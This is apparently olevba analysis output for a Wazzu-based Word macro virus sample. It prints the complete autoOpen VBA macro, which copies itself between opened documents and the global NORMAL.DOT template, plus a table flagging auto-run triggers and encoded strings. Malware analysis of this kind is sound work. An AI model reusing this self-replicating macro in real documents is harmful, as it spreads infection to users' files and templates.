olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu-based-07ca28618c52377777f50b293cd104a95e2b9291
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu-based-07ca28618c52377777f50b293cd104a95e2b9291 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu-based-07ca28618c52377777f50b293cd104a95e2b9291 - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim fileMacro$
Dim globMacro$
Dim MacroFile$
WordBasic.FileSummaryInfo Update:=1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.DocumentStatistics(False)
WordBasic.CurValues.DocumentStatistics dlg
fileMacro$ = dlg.Directory + "\" + dlg.FileName + ":autoOpen"
'filemacro1$ = dlg.Directory + "\" + dlg.FileName + ":autoClose"
globMacro$ = "Global:autoOpen"
'globMacro1$ = "Global:autoClose"
MacroFile$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If MacroFile$ = "NORMAL.DOT" Then
WordBasic.MacroCopy globMacro$, fileMacro$
'MacroCopy globMacro1$, fileMacro1$
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy fileMacro$, globMacro$
'MacroCopy fileMacro1$, globMacro1$
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

